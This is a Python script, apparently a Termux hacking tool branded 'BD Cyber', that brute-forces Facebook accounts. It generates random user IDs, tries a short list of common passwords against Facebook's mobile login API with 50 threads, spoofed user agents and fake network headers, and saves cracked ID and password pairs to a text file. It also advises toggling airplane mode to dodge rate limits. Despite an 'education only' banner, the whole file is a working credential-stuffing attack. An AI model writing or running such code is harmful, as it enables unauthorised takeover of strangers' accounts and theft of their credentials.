import os
try:
	import requests
except ImportError:
	os.system ("pip install requests")
	
try:
	import concurrent.futures
except ImportError:
	os.system ("pip install futures")
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
R = '\x1b[38;5;196m'
W = '\x1b[38;5;231m'
P = '\x1b[38;5;205m'
C = '\x1b[38;5;117m'
Y = '\x1b[38;5;227m'
X = '\x1b[38;5;244m'
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
os.system ("clear")
print(f"{R}[{W}✘{R}] {G3}CHECKING UPDATE ...")
time.sleep(1)
os.system ("clear")
print(f"{R}[{W}✘{R}] {G4}INSTALLING TOOLS{R}●{Y}●{P}●")
time.sleep(1)
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
try:
	import rich
except ImportError:
	os.system ("pip install rich")
	time.sleep (1)
	try:
		import rich
	except ImportError:
		exit(" [✘] Can't Install Rich Module, Try Manual Install (pip install rich)")
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
def linex():
	print (45* f"{W}━")
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
def clear():
	os.system ("clear")
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
rug=[]
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    rug.append(ua)
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
sys.stdout.write('\x1b]2; =[✘] MAMUN [✘]=\x07')
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
logo=(f"""                                 
{G1}  ███   ████   █   █  ███  █   █ █   █ █   █ 
{G2} █   █  █   █  ██ ██ █   █ ██ ██ █   █ ██  █ 
{G3} █████  ████   █ █ █ █████ █ █ █ █   █ █ █ █ 
{G4} █   █  █   █  █   █ █   █ █   █ █   █ █  ██ 
{G5} █   █  █   █  █   █ █   █ █   █ █████ █   █ 
{W}┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐   
┃      {P}𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝘽𝘿 𝘾𝙔𝘽𝙀𝙍 𝙏𝙀𝙍𝙈𝙐𝙓 𝙕𝙊𝙉𝙀{W}      ┃
┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃
┃ {R}[{W}✘{R}] {G5}FACEBOOK    {W}●  {X} [ {G2} 𝘼 𝙍 𝙈𝘼𝙈𝙐𝙉 {X} ]       {W}┃
┃ {R}[{W}✘{R}] {G4}CREATOR     {W}●   {G3}MD MAMUN HOSSAIN      {W}┃
┃ {R}[{W}✘{R}] {G3}GITHUB ACC  {W}●   {G4}BD-CYBER {G5}[{R}FOLLOW ME{G5}]  {W}┃
┃ {R}[{W}✘{R}] {G2}NOTE {R} ✘     {W}●   {G5}USE ONLY FOR EDUCATION{W}┃
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		clear()
		print(logo)
		print(f" {W}[{G3}A{W}] {G5}OLD ACCOUNT CRACK\n {W}[{G5}B{W}] {P}BD CYBER TERMUX ZONE\n {W}[{R}C{W}] {R}EXIT")
		linex()
		MAMUN =input(f" {R}[{W}✘{R}] {G5}Please Choose : {P}")
		if MAMUN in ["A", "a"]:
			self.old()
		if MAMUN in ["B", "b"]:
			linex()
			print (f"{R}[{W}✘{R}] {P} Join Ours Public Group For More Update")
			linex()
			time.sleep (1)
			os.system("xdg-open https://www.facebook.com/groups/710394760477430/")
			exit()
		if MAMUN in ["C", "c"]:
			linex()
			print (f" {R}[{W}✘{R}] {G4}Thanks for using BD CYBER Tools")
			linex()
			time.sleep (2)
			exit()
		else:
			linex()
			print (f" {R}[{W}✘{R}] {P}Wrong Keyword! {G5}Please Select Correctly.")
			linex()
			time.sleep(2)
			Main()
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
	def old(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		clear()
		print (logo)
		print (f" {R}[{W}✘{R}]{G5} CRACKING LIMIT{X}- {P}10000{X}|{P}20000{X}|{P}30000{X}|{P}40000")
		linex()
		limit = int(input(f" {R}[{W}✘{R}] {G3}INPUT LIMIT : {P}"))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			with ThreadPoolExecutor(max_workers=50) as coeg:
				listpass = ['123456','1234567','12345678','123456789','1234567890','123123','420420','789789','786786','143143']
				os.system("clear")
				print(logo)
				print(f" {R}[{W}+{R}] {Y}TOTAL ID = {G4}%s{P}"%(len(self.id)))
				print(f" {R}[{W}+{R}] {W}BRUTE HAS BEEN START \n {R}[{W}+{R}] {G3}Note: 0k Open 70% JUST NOW\n {R}[{W}!{R}] {P}USE AIRPLANE MODE EVERY 3 MINUTES")
				linex()
				for user in self.id:
					coeg.submit(self.api, user, listpass)
			exit(f"{W}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {R}[{W}✘{R}]{G5} PROCESS COMPLETE...\n {R}[{W}✘{R}] {G3}Thanks for using my tool...\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		except Exception as e:exit(str(e))
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
	def api(self, uid, pwx):
		ug=random.choice(rug)
		sys.stdout.write(
			f"\r {W}[{G3}BD{R}-{G5}CYBER{W}] {Y}%s{X}|{W}%s{X}|{P}OK{X}|{G4}%s{X}|{Y}CP{X}|{P}%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ug, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text:
				print(f"\r {G1}[MAMUN-OK ] {G3}%s{X}|{G4}%s{G1}         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("MAMUN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print(f"\r {G1}[MAMUN-OK] {G4}%s{X}|{G5}%s{G1}         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("MAMUN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
 
		self.loop +=1
##━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━##
if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()
 
try:Main()
except Exception as e:exit(str(e))
